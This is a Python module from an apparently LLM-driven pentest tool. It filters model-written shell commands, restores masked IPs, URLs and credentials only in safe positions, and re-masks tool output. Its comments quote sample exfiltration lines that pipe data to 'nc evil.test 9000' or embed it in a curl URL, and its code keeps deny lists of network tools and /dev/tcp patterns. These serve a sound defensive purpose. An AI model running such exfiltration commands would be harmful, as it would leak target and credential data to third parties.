"""
CommandGateway - context-aware rehydration + exfiltration control.

The gateway sits between the LLM and local execution. It:
  * receives an LLM-generated raw command or a structured tool call,
  * detects placeholders and validates they are allowed *in that position*,
  * rehydrates placeholders only in approved argument positions,
  * withholds the real value where the position is an exfiltration sink,
  * hands back a real command for local execution,
  * re-sanitizes stdout/stderr before results go back to the LLM.

Rehydration is deliberately NOT a naive global string replace: a placeholder is
only turned back into its real value after the surrounding shell context has
been proven safe, and only for placeholder tokens known to the session vault.

Policy: degrade, do not deny
---------------------------
Widening the default protection boundary to URL/DOMAIN/PATH (issue #40, merged
as PR #41) meant that essentially *every* pentest command now carries a
placeholder, so every exfiltration rule started firing on legitimate work and
the gateway became a campaign-stopper: 9 of 15 ordinary commands were refused,
and a URL containing `?` could not be rehydrated at all because the injection
guard rejected the metacharacter (PR #42).

Blocking was never the thing protecting the operator. Two things are:
  1. the model only ever receives placeholders, and
  2. every byte of tool output is re-tokenized before the model sees it.

So the gateway no longer refuses a command. When a placeholder sits in a
position that would hand its real value to a third party, the command is
executed with that *placeholder left in place* - the third party receives the
meaningless token `IP_PRIVATE_001`, the command still runs, and the campaign
continues. That is `GatewayPolicy.DEGRADE`, the default.

`GatewayPolicy.STRICT` keeps the previous refuse-outright behaviour for
operators who want it (`DARKMOON_PRIVACY_POLICY=strict`).
"""

from __future__ import annotations

import os
import re
import shlex
from dataclasses import dataclass, field
from enum import Enum
from typing import Any, Dict, List, Optional, Sequence, Set, Tuple
from urllib.parse import urlsplit

from .vault import PrivacyVault, PLACEHOLDER_RE, PLACEHOLDER_ANY_RE

# Commands that print a value straight back into stdout. Not an exfiltration
# vector on their own: stdout is re-tokenized by sanitize_output() before the
# model sees it, so `cat PATH_001` reveals nothing. Credentials are the one
# exception (see _CRED_UNSAFE_SINKS) because a tool may reformat a secret in a
# way the output sanitizer cannot match back.
_PRINT_SINKS = {"echo", "printf", "print", "cat", "tee", "logger", "write"}
# Commands whose *destination* is a host we could exfiltrate to.
_NET_SINKS = {"curl", "wget", "nc", "ncat", "netcat", "telnet", "ssh", "scp", "sftp", "ftp", "socat"}
_SHELL_WRAPPERS = {"bash", "sh", "zsh", "dash", "ash"}
# curl/wget flags that put data in the *outbound* request body.
_OUTBOUND_DATA_FLAGS = {
    "-d", "--data", "--data-raw", "--data-binary", "--data-ascii",
    "--data-urlencode", "-F", "--form", "--form-string", "-T", "--upload-file",
}
# A secret is never restored into a command that only prints it: the round trip
# through a tool's own formatting is not guaranteed to survive the output
# sanitizer intact, and a credential is the one value we cannot risk.
_CRED_UNSAFE_SINKS = _PRINT_SINKS

_NET_REDIRECT_RE = re.compile(r"/dev/(?:tcp|udp)/|>\(|<\(")
_HTTP_URL_RE = re.compile(r"https?://[^\s\"'<>`|\\]+", re.IGNORECASE)
# Shell operators that start a new command. Each side of a pipeline is analysed
# on its own: `echo IP_PRIVATE_001 | nc evil.test 9000` is an exfiltration even
# though its first word is a harmless print sink.
_PIPELINE_OPS = ("||", "&&", "|", ";", "&")
# Command substitution and parameter expansion. `shlex.split` tears
# `curl http://evil.test/$(echo IP_PRIVATE_001)` into a URL token with no
# placeholder in it and a separate placeholder token, so the per-token URL check
# saw nothing to object to and the address was rehydrated straight into a request
# to a third party. Whatever a substitution expands to is not analysable here, so
# a placeholder sharing a segment with one is never resolved.
_CMD_SUBST_RE = re.compile(r"\$\(|\$\{|`")
# Flags that take a separate value; that value is never the destination host.
_VALUE_FLAGS = {"-p", "-P", "-l", "-i", "-o", "-b", "-c", "-m", "-w", "-s", "-F", "-e", "-L", "-R", "-D"}


class GatewayPolicy(str, Enum):
    """What the gateway does when a placeholder sits in an unsafe position."""

    #: Execute the command with that placeholder left un-rehydrated. Never blocks.
    DEGRADE = "degrade"
    #: Refuse the command outright (the pre-#40 behaviour).
    STRICT = "strict"


def resolve_policy(raw: Optional[str] = None) -> GatewayPolicy:
    """Resolve DARKMOON_PRIVACY_POLICY; anything unrecognised means DEGRADE.

    Defaulting an unknown value to DEGRADE is deliberate: a typo in an operator's
    environment must never silently turn the gateway back into a campaign-stopper.
    """
    value = (raw if raw is not None else os.getenv("DARKMOON_PRIVACY_POLICY", "")).strip().lower()
    return GatewayPolicy.STRICT if value in ("strict", "block", "deny") else GatewayPolicy.DEGRADE


def cred_injection_enabled() -> bool:
    """Whether a registered credential may be injected into a local command.

    On by default: without it a credentialed command cannot run at all, which is
    exactly the campaign-stopping behaviour this module exists to remove. The
    injection is still confined to a command whose destination is the protected
    target (see `_cred_injection_safe`).
    """
    return os.getenv("DARKMOON_PRIVACY_CRED_INJECT", "1").strip().lower() not in ("0", "false", "no", "off")


class GatewayDecision(str, Enum):
    ALLOW = "allow"
    BLOCK = "block"


@dataclass
class GatewayResult:
    decision: GatewayDecision
    # For ALLOW (raw command): the real, locally-executable command.
    command: Optional[str] = None
    # For ALLOW (structured tool call): the rehydrated argument dict.
    resolved: Optional[Dict[str, object]] = None
    # For BLOCK: human-readable reason (safe to show the LLM - no real values).
    reason: Optional[str] = None
    placeholders: List[str] = field(default_factory=list)
    # Placeholders deliberately left un-rehydrated because their position was
    # unsafe. The command still ran; these tokens went out as literal text.
    withheld: List[str] = field(default_factory=list)
    # Why each value was withheld. Safe to show the LLM: never a real value.
    notes: List[str] = field(default_factory=list)

    @property
    def allowed(self) -> bool:
        return self.decision == GatewayDecision.ALLOW

    @property
    def blocked(self) -> bool:
        return self.decision == GatewayDecision.BLOCK

    @property
    def degraded(self) -> bool:
        """The command ran, but at least one value was held back."""
        return self.allowed and bool(self.withheld)


# --------------------------------------------------------------------------
# Shell-safe substitution
# --------------------------------------------------------------------------
def _quote_for_context(value: str, in_single: bool, in_double: bool) -> str:
    """Escape ``value`` so it cannot break out of the shell context it lands in.

    The previous implementation *refused* any value containing a shell
    metacharacter. That is what made `httpx -u URL_001` unrunnable the moment
    URL became a default category, because `?` is a metacharacter and virtually
    every real URL has a query string. Quoting is both safer and non-blocking:
    it also fixes values containing a space, which the old guard let through
    unquoted and which then silently split into two arguments.
    """
    if in_single:
        # Close the quote, emit an escaped quote, reopen. The standard sh idiom.
        return value.replace("'", "'\\''")
    if in_double:
        return re.sub(r'(["\\$`])', r"\\\1", value)
    return shlex.quote(value)


def _quote_states(command: str) -> List[Tuple[bool, bool]]:
    """(in_single, in_double) as of each character offset in ``command``."""
    states: List[Tuple[bool, bool]] = []
    in_single = in_double = False
    escaped = False
    for ch in command:
        states.append((in_single, in_double))
        if escaped:
            escaped = False
            continue
        if ch == "\\" and not in_single:
            escaped = True
        elif ch == "'" and not in_double:
            in_single = not in_single
        elif ch == '"' and not in_single:
            in_double = not in_double
    return states


def _substitute(command: str, real_map: Dict[str, str]) -> str:
    """Replace placeholders with their real values, quoted for their context.

    Walks the command tracking quote state so a value dropped inside `'...'` or
    `"..."` is escaped for *that* context rather than wrapped in a fresh pair of
    quotes that would end up literal. A placeholder absent from ``real_map`` was
    withheld and is left exactly as the model wrote it.
    """
    states = _quote_states(command)
    out: List[str] = []
    cursor = 0
    for match in PLACEHOLDER_ANY_RE.finditer(command):
        ph = match.group("ph")
        if ph not in real_map:
            continue
        start, end = match.span()
        single, double = states[start]
        out.append(command[cursor:start])
        out.append(_quote_for_context(real_map[ph], single, double))
        cursor = end
    out.append(command[cursor:])
    return "".join(out)


def _split_pipeline(command: str) -> List[str]:
    """Split a shell line into its individual commands, respecting quotes.

    `shlex.split` flattens `a | b` into a single argv, so any rule keyed on
    argv[0] only ever saw the first command of a pipeline and missed the sink at
    the far end of it.
    """
    segments: List[str] = []
    current: List[str] = []
    in_single = in_double = False
    escaped = False
    i = 0
    while i < len(command):
        ch = command[i]
        if escaped:
            current.append(ch)
            escaped = False
            i += 1
            continue
        if ch == "\\" and not in_single:
            current.append(ch)
            escaped = True
            i += 1
            continue
        if ch == "'" and not in_double:
            in_single = not in_single
        elif ch == '"' and not in_single:
            in_double = not in_double
        if not in_single and not in_double:
            matched = next((op for op in _PIPELINE_OPS if command.startswith(op, i)), None)
            if matched is not None:
                segments.append("".join(current))
                current = []
                i += len(matched)
                continue
        current.append(ch)
        i += 1
    segments.append("".join(current))
    return [seg for seg in (s.strip() for s in segments) if seg]


def _shell_wrapper_parts(command: str) -> Optional[Tuple[List[str], int]]:
    """(argv, index of -c) when ``command`` is a `sh -c '<inner>'` invocation."""
    try:
        argv = shlex.split(command)
    except ValueError:
        return None
    if not argv:
        return None
    if os.path.basename(argv[0]) not in _SHELL_WRAPPERS or "-c" not in argv:
        return None
    idx = argv.index("-c")
    if idx + 1 >= len(argv):
        return None
    return argv, idx


def _destination_arg(argv: Sequence[str]) -> Optional[str]:
    """First positional argument of a network sink: its destination.

    Skips flags *and* the values that belong to them, so `ssh -p 2222 host`
    reports `host` rather than `2222`.
    """
    i = 1
    while i < len(argv):
        arg = argv[i]
        if arg.startswith("-"):
            i += 2 if arg in _VALUE_FLAGS else 1
            continue
        return arg
    return None


def _host_part(destination: str) -> str:
    """The host component of a destination argument.

    Handles the shapes real lateral movement uses: `HOST`, `user@HOST`,
    `user@HOST:/path`, `HOST:port`, `scheme://user@HOST/path`.
    """
    value = destination
    if "://" in value:
        value = value.split("://", 1)[1]
    if "@" in value:
        value = value.rsplit("@", 1)[1]
    value = value.split("/", 1)[0]
    if ":" in value:
        value = value.split(":", 1)[0]
    return value.strip()


def _host_part_is_placeholder(destination: str) -> bool:
    return bool(PLACEHOLDER_RE.fullmatch(_host_part(destination)))


class CommandGateway:
    """Stateless policy engine; all secret state lives in the per-session vault."""

    def __init__(self, policy: Optional[GatewayPolicy] = None) -> None:
        self._policy = policy

    @property
    def policy(self) -> GatewayPolicy:
        """Resolved at access time so an operator can flip the env var live."""
        return self._policy if self._policy is not None else resolve_policy()

    def _block(self, reason: str, placeholders: Sequence[str]) -> GatewayResult:
        return GatewayResult(GatewayDecision.BLOCK, reason=reason, placeholders=list(placeholders))

    def _url_context_block_reason(self, value: str) -> Optional[str]:
        """Return a reason when a URL sends a placeholder to a third party."""
        for match in _HTTP_URL_RE.finditer(value):
            url = match.group(0)
            if not PLACEHOLDER_RE.search(url):
                continue
            parts = urlsplit(url)
            host = (parts.hostname or "").upper()
            host_is_placeholder = bool(PLACEHOLDER_RE.fullmatch(host))
            if PLACEHOLDER_RE.search(parts.query) or PLACEHOLDER_RE.search(parts.fragment):
                return "placeholder embedded in a URL query/fragment (exfiltration vector)"
            if not host_is_placeholder:
                return "placeholder sent to a literal (non-target) URL host (exfiltration)"
        return None

    # ------------------------------------------------------------------ raw shell
    def process_command(
        self,
        command: str,
        vault: PrivacyVault,
        _depth: int = 0,
        enforce_exfil_policy: bool = True,
        policy: Optional[GatewayPolicy] = None,
    ) -> GatewayResult:
        """Turn an LLM-written command into a locally executable one.

        Under ``GatewayPolicy.DEGRADE`` (the default) this never returns BLOCK: a
        placeholder whose position is unsafe is left un-rehydrated, so the command
        runs and whatever reads it receives the token rather than the value.
        ``enforce_exfil_policy=False`` (PR #42's per-session override) relaxes the
        positional rules further, which only ever widens what gets rehydrated.
        """
        effective = policy or self.policy
        strict = effective is GatewayPolicy.STRICT

        placeholders = list(dict.fromkeys(PLACEHOLDER_ANY_RE.findall(command)))
        if not placeholders:
            # No sensitive tokens involved - pass through unchanged.
            return GatewayResult(GatewayDecision.ALLOW, command=command)

        withheld: Set[str] = set()
        notes: List[str] = []

        def hold(phs: Sequence[str], reason: str) -> Optional[GatewayResult]:
            """Withhold values (degrade) or refuse the command (strict)."""
            if strict:
                return self._block(reason, placeholders)
            targets = [p for p in phs if p not in withheld]
            if targets:
                withheld.update(targets)
                notes.append(f"{reason}: {', '.join(sorted(targets))} left tokenized")
            return None

        # A placeholder the vault never minted cannot be resolved. Passing it
        # through as literal text is harmless and lets the tool report the real
        # error, which the model can act on; refusing the command taught it
        # nothing and cost a step.
        unknown = [p for p in placeholders if vault.category_of(p) is None]
        if unknown:
            refused = hold(unknown, "placeholder(s) not issued this session")
            if refused is not None:
                return refused

        if vault.is_expired():
            refused = hold(placeholders, "session privacy vault expired")
            if refused is not None:
                return refused

        if _depth > 3:
            refused = hold(placeholders, "command nesting too deep to analyse")
            if refused is not None:
                return refused
            return self._rehydrate(command, placeholders, vault, withheld, notes, strict)

        segments = _split_pipeline(command)

        # A `bash -c '<inner>'` invocation is resolved by rehydrating <inner> on
        # its own and re-quoting the result as a single argument. Substituting
        # into the outer string instead would leave the value quoted for the
        # OUTER shell only, and the inner shell would then re-parse a `|` or `;`
        # inside a rehydrated URL as an operator.
        if len(segments) == 1 and _depth <= 3:
            wrapper = _shell_wrapper_parts(segments[0])
            if wrapper is not None:
                argv, idx = wrapper
                inner = self.process_command(
                    argv[idx + 1], vault, _depth=_depth + 1,
                    enforce_exfil_policy=enforce_exfil_policy, policy=effective,
                )
                if inner.blocked:
                    return inner
                rebuilt = " ".join(argv[:idx + 1]) + " " + shlex.quote(inner.command or "")
                return GatewayResult(
                    GatewayDecision.ALLOW, command=rebuilt, placeholders=placeholders,
                    withheld=inner.withheld, notes=inner.notes,
                )

        # A pipeline moves data between its commands, so a placeholder held by
        # one segment reaches the sink in another: `echo IP_PRIVATE_001 | nc
        # evil.test 9000` is an exfiltration even though neither half looks like
        # one on its own. If any segment sends data somewhere that is not the
        # protected target, nothing in the whole line is resolved.
        if enforce_exfil_policy and len(segments) > 1 and self._pipeline_leaves_target(segments):
            refused = hold(placeholders, "pipeline ends at a destination that is not the protected target")
            if refused is not None:
                return refused

        # Analyse every command in the pipeline, not just the first one.
        for segment in segments:
            refused = self._analyse_segment(
                segment, vault, enforce_exfil_policy, _depth, effective, placeholders, hold,
            )
            if refused is not None:
                return refused

        return self._rehydrate(command, placeholders, vault, withheld, notes, strict)

    def _pipeline_leaves_target(self, segments: Sequence[str]) -> bool:
        """True when any command in the pipeline sends data off the target path."""
        for segment in segments:
            if _NET_REDIRECT_RE.search(segment):
                return True
            try:
                argv = shlex.split(segment)
            except ValueError:
                return True  # cannot prove it is safe
            if not argv:
                continue
            tool = os.path.basename(argv[0])
            if tool in _NET_SINKS:
                if tool in {"curl", "wget"}:
                    for tok in argv[1:]:
                        for match in _HTTP_URL_RE.finditer(tok):
                            host = (urlsplit(match.group(0)).hostname or "").upper()
                            if not PLACEHOLDER_RE.fullmatch(host):
                                return True
                    continue
                dest = _destination_arg(argv)
                if dest is None or not _host_part_is_placeholder(dest):
                    return True
        return False

    def _analyse_segment(
        self,
        segment: str,
        vault: PrivacyVault,
        enforce_exfil_policy: bool,
        _depth: int,
        policy: GatewayPolicy,
        placeholders: Sequence[str],
        hold,
    ) -> Optional[GatewayResult]:
        """Apply the positional rules to one command of a pipeline.

        Returns a BLOCK result under the strict policy, otherwise None after
        recording any withheld placeholders through ``hold``.
        """
        seg_phs = list(dict.fromkeys(PLACEHOLDER_ANY_RE.findall(segment)))
        if not seg_phs:
            return None
        try:
            argv = shlex.split(segment)
        except ValueError:
            # Unparseable: we cannot prove any position here is safe, so nothing
            # in this segment is resolved. The command still runs, carrying the
            # tokens.
            return hold(seg_phs, "command could not be parsed safely")
        if not argv:
            return None

        tool = os.path.basename(argv[0])

        # 1) Shell wrappers: analyse the inner command with the same rules. The
        #    single-command case is rebuilt by process_command; here we only
        #    carry the inner verdict up for a wrapper inside a larger pipeline.
        if tool in _SHELL_WRAPPERS and "-c" in argv:
            idx = argv.index("-c")
            if idx + 1 >= len(argv):
                return hold(seg_phs, "malformed shell -c invocation")
            inner = self.process_command(
                argv[idx + 1], vault, _depth=_depth + 1,
                enforce_exfil_policy=enforce_exfil_policy, policy=policy,
            )
            if inner.blocked:
                return inner
            if inner.withheld:
                return hold(inner.withheld, "unsafe position inside a nested shell command")
            return None

        if enforce_exfil_policy:
            # 2) Genuine outbound channels. Each hands the value to something we
            #    do not control and, unlike stdout, there is no sanitizer between
            #    it and the outside world.

            # 2a) Network redirection / process substitution.
            if _NET_REDIRECT_RE.search(segment):
                refused = hold(seg_phs, "network redirect / process substitution")
                if refused is not None:
                    return refused

            # 2b) Command substitution: we cannot see where the expansion lands.
            if _CMD_SUBST_RE.search(segment):
                refused = hold(seg_phs, "value inside a command substitution (destination unknown)")
                if refused is not None:
                    return refused

            # 2c) Per-token URL analysis (the classic exfil vector).
            for tok in argv:
                reason = self._url_context_block_reason(tok)
                if reason is not None:
                    refused = hold(PLACEHOLDER_ANY_RE.findall(tok), reason)
                    if refused is not None:
                        return refused

            # 2d) Outbound request bodies (curl/wget POST/upload).
            for i, tok in enumerate(argv):
                if tok in _OUTBOUND_DATA_FLAGS:
                    in_body = PLACEHOLDER_ANY_RE.findall(argv[i + 1] if i + 1 < len(argv) else "")
                elif "=" in tok and tok.split("=", 1)[0] in _OUTBOUND_DATA_FLAGS:
                    in_body = PLACEHOLDER_ANY_RE.findall(tok)
                else:
                    continue
                if in_body:
                    refused = hold(in_body, "value placed in an outbound request body/upload")
                    if refused is not None:
                        return refused

            # 2e) Bare network sinks (nc/telnet/ssh/...): the destination must be
            #     the target itself, never a literal third party. `ssh
            #     admin@IP_PRIVATE_001` and `scp f user@IP_001:/tmp` are ordinary
            #     lateral movement; the old check compared the *whole* argument
            #     against a placeholder, so a user@ prefix, a port flag value or a
            #     path suffix all read as a third-party destination and refused
            #     the command.
            if tool in _NET_SINKS and tool not in {"curl", "wget"}:
                dest = _destination_arg(argv)
                if dest is not None and not _host_part_is_placeholder(dest):
                    refused = hold(seg_phs, f"'{tool}' destination is not the protected target")
                    if refused is not None:
                        return refused

        # 3) Credentials. A secret is never restored into a command that merely
        #    prints it, nor into one whose destination is not the protected
        #    target. Everywhere else it may be injected locally so credentialed
        #    testing works without the model ever holding the secret (issue #40,
        #    "restricted local credential injection path").
        creds = [p for p in seg_phs if vault.category_of(p) in vault.SECRET_CATEGORIES]
        if creds:
            reason = self._cred_refusal_reason(tool, argv, segment, seg_phs)
            if reason is not None:
                refused = hold(creds, reason)
                if refused is not None:
                    return refused
        return None

    def _cred_refusal_reason(
        self, tool: str, argv: Sequence[str], segment: str, seg_phs: Sequence[str]
    ) -> Optional[str]:
        """Why this segment must not receive a real credential, or None if it may."""
        if not cred_injection_enabled():
            return "credential injection disabled (DARKMOON_PRIVACY_CRED_INJECT=0)"
        if tool in _CRED_UNSAFE_SINKS:
            return f"secret not restored into '{tool}'"
        # The credential may only travel to the protected target, so the segment
        # has to name that target through a placeholder and must not carry a
        # literal external destination alongside it.
        for match in _HTTP_URL_RE.finditer(segment):
            host = (urlsplit(match.group(0)).hostname or "").upper()
            if not PLACEHOLDER_RE.fullmatch(host):
                return "secret alongside a literal (non-target) destination"
        if tool in _NET_SINKS:
            dest = _destination_arg(argv)
            if dest is not None and not _host_part_is_placeholder(dest):
                return "secret alongside a literal (non-target) destination"
        non_cred = [p for p in seg_phs if not p.startswith("CRED_")]
        if not non_cred:
            return "secret used without a protected target in the same command"
        return None

    def _rehydrate(
        self,
        command: str,
        placeholders: Sequence[str],
        vault: PrivacyVault,
        withheld: Optional[Set[str]] = None,
        notes: Optional[List[str]] = None,
        strict: bool = False,
    ) -> GatewayResult:
        held: Set[str] = set(withheld or ())
        note_list: List[str] = list(notes or ())
        real_map: Dict[str, str] = {}

        for ph in placeholders:
            if ph in held:
                continue
            cat = vault.category_of(ph)
            if cat is None:
                if strict:
                    return self._block(f"could not resolve placeholder {ph}", placeholders)
                held.add(ph)
                continue
            # Secrets reach this point only from a position `_cred_refusal_reason`
            # approved: a local execution path against the protected target.
            real = vault.rehydrate(ph, allow_secret=cat in vault.SECRET_CATEGORIES)
            if real is None:
                if strict:
                    return self._block(f"could not resolve placeholder {ph}", placeholders)
                held.add(ph)
                note_list.append(f"could not resolve {ph}: left tokenized")
                continue
            real_map[ph] = real

        # A resolved value used to be *refused* when it carried a shell
        # metacharacter. It is now quoted for the exact context it lands in,
        # which is what that guard was actually trying to achieve.
        return GatewayResult(
            GatewayDecision.ALLOW,
            command=_substitute(command, real_map),
            placeholders=list(placeholders),
            withheld=sorted(held),
            notes=note_list,
        )

    # ------------------------------------------------------------- structured tool
    def process_tool_call(
        self,
        tool: str,
        args: Dict[str, object],
        rehydrate_fields: Sequence[str],
        vault: PrivacyVault,
        enforce_exfil_policy: bool = True,
        policy: Optional[GatewayPolicy] = None,
    ) -> GatewayResult:
        """Rehydrate only the whitelisted fields of a structured tool call.

        Everything not in ``rehydrate_fields`` is left as-is. Under DEGRADE a
        placeholder in a non-approved field is simply not resolved - the workflow
        receives the token - rather than failing the whole call.
        """
        effective = policy or self.policy
        strict = effective is GatewayPolicy.STRICT
        resolved: Dict[str, object] = {}
        seen: List[str] = []
        withheld: Set[str] = set()
        notes: List[str] = []
        allow = set(rehydrate_fields)

        def collect_placeholders(value: object) -> List[str]:
            if isinstance(value, str):
                return PLACEHOLDER_ANY_RE.findall(value)
            if isinstance(value, dict):
                found: List[str] = []
                for nested_key, nested_value in value.items():
                    found.extend(collect_placeholders(nested_key))
                    found.extend(collect_placeholders(nested_value))
                return found
            if isinstance(value, (list, tuple)):
                found = []
                for item in value:
                    found.extend(collect_placeholders(item))
                return found
            return []

        def resolve_value(value: object) -> Tuple[object, Optional[GatewayResult]]:
            if isinstance(value, str):
                phs = list(dict.fromkeys(PLACEHOLDER_ANY_RE.findall(value)))
                if not phs:
                    return value, None
                seen.extend(phs)
                unsafe: List[str] = []
                if enforce_exfil_policy:
                    reason = self._url_context_block_reason(value)
                    if reason is not None:
                        if strict:
                            return value, self._block(reason, phs)
                        unsafe = list(phs)
                        notes.append(f"{reason}: {', '.join(phs)} left tokenized")
                # A workflow parameter is not a shell command, so a credential in
                # one has no vetted local execution path: keep it tokenized.
                secrets = [p for p in phs if vault.category_of(p) in vault.SECRET_CATEGORIES]
                if secrets:
                    if strict:
                        return value, self._block(
                            f"secret value {secrets[0]} is never restored into a workflow parameter", phs
                        )
                    unsafe.extend(secrets)
                    notes.append(f"secret not restored into a workflow parameter: {', '.join(secrets)}")
                withheld.update(unsafe)
                result = self._rehydrate(value, phs, vault, set(withheld), notes, strict)
                if result.blocked:
                    return value, result
                withheld.update(result.withheld)
                return result.command or value, None
            if isinstance(value, (list, tuple)):
                output = []
                for item in value:
                    resolved_item, error = resolve_value(item)
                    if error is not None:
                        return value, error
                    output.append(resolved_item)
                return (tuple(output) if isinstance(value, tuple) else output), None
            if isinstance(value, dict):
                output = {}
                for nested_key, nested_value in value.items():
                    resolved_key, error = resolve_value(nested_key)
                    if error is not None:
                        return value, error
                    resolved_value, error = resolve_value(nested_value)
                    if error is not None:
                        return value, error
                    output[resolved_key] = resolved_value
                return output, None
            return value, None

        for key, value in args.items():
            phs = collect_placeholders(value)
            if phs and key not in allow:
                reason = f"placeholder in non-approved field '{key}' (only {sorted(allow)} may be rehydrated)"
                if strict:
                    return self._block(reason, phs)
                withheld.update(phs)
                seen.extend(phs)
                notes.append(f"{reason}: left tokenized")
                resolved[key] = value
                continue
            if not phs:
                resolved[key] = value
                continue
            resolved_value, error = resolve_value(value)
            if error is not None:
                return error
            resolved[key] = resolved_value

        return GatewayResult(
            GatewayDecision.ALLOW,
            resolved=resolved,
            placeholders=list(dict.fromkeys(seen)),
            withheld=sorted(withheld),
            notes=notes,
        )

    def sanitize_result(self, value: Any, vault: PrivacyVault) -> Any:
        """Sanitize each string in a structured workflow result."""
        if isinstance(value, str):
            return self.sanitize_output(value, vault)
        if isinstance(value, list):
            return [self.sanitize_result(item, vault) for item in value]
        if isinstance(value, tuple):
            return tuple(self.sanitize_result(item, vault) for item in value)
        if isinstance(value, dict):
            return {
                self.sanitize_result(key, vault): self.sanitize_result(item, vault)
                for key, item in value.items()
            }
        return value

    # ------------------------------------------------------------------ output
    def sanitize_output(self, text: str, vault: PrivacyVault) -> str:
        """Re-tokenize any real value in tool output before the LLM sees it.

        Three passes: (1) credential detection, which has no regex category of
        its own and used to be missing entirely (issue #40); (2) pattern-based
        tokenization (catches new + known values, deterministically reusing
        existing placeholders); (3) a belt-and-braces replacement of any *known*
        real value that slipped past the patterns.

        This is the pass that makes the degrade policy safe: whatever a command
        printed, the model receives placeholders.
        """
        if not text:
            return text
        out = vault.register_credentials(text)
        out = vault.tokenize(out)
        # Belt-and-braces pass for values the patterns cannot match: only the
        # register-only categories (credentials/usernames) or categories not
        # covered by the regex pass. Skipping the pattern-covered categories
        # avoids decrypting every known value on large outputs (O(N) -> O(few)).
        regex_cats = set(vault.enabled_categories)
        for ph in vault.known_placeholders():
            cat = vault.category_of(ph)
            if cat in regex_cats:
                continue  # already handled deterministically by tokenize()
            real = vault.rehydrate(ph, allow_secret=True)  # local masking may touch secrets to hide them
            if real and real in out:
                out = out.replace(real, ph)
        return out
